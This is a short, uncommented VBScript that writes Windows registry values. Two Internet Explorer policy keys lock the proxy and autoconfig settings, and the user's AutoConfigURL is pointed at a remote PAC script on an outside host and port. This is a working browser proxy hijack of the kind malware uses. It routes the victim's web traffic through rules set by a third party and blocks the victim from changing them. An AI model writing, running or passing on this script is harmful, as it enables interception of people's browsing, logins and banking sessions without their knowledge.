Set WshShell = CreateObject("WScript.Shell")
proxyKey = "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Control Panel\Proxy"
autoConfigKey = "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Control Panel\Autoconfig"
autoConfigURLKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL"
WshShell.RegWrite proxyKey, 1, "REG_DWORD"
WshShell.RegWrite autoConfigKey, 1, "REG_DWORD"
WshShell.RegWrite autoConfigURLKey, "http://codiplay.com:3232/skec.js", "REG_SZ"
Set WshShell = Nothing
